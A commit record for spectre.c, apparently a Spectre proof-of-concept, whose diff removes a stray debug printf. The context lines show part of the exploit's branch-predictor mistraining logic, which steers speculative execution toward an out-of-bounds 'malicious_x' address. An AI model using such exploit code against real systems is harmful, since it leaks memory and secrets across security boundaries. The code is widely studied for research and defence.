eb96a2b9b605661db68d99e18303365c3e2361e2
Ryan Crosby <rcrosby@nucleus.cros.net.au>
2023-01-29 02:27:37 +1100

    Remove printf that was accidentally added in 68db1a3e545039d23401dbf69faa1b29bd291dbe

--- spectre.c
+++ spectre.c
@@ -189,7 +189,6 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=0xFFFFFFFFFFFF0000 if j%6==0, else x=0 */
-      printf("%lx\n", x);
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
 
